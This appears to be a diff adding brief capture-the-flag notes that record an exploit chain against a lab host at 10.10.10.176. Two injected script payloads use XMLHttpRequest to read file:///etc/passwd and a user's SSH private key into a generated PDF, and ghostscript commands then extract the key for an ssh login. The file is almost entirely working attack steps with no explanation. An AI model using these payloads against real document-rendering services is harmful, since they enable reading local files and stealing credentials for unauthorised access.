@@ -1,0 +1,12 @@
+initial test: 
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+
+getting ssh key: 
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+
+making ssh key into a valid format: 
+gs -sDEVICE=txtwrite -o - rsa_key.pdf
+chmod 600 rsa_key.txt 
+
+login using ssh:
+ssh -i rsa_key.txt reader@10.10.10.176
